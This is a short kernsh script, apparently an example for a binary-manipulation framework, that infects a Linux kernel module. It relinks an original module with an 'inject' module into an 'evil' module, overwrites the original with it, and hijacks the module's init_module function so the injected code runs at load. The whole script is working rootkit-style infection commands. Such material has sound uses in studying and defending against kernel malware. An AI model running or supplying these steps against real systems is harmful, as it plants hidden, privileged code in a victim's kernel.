#!/usr/local/bin/kernsh
# Linked tow module and hijack function init_module with an evil (inject) function

kmodule_relink lkm-original.ko lkm-inject.ko lkm-evil.ko
exec mv -f lkm-evil.ko lkm-original.ko

load lkm-original.ko
rel
unload lkm-original.ko

kmodule_infect lkm-original.ko init_module inject

load lkm-original.ko
rel
unload lkm-original.ko

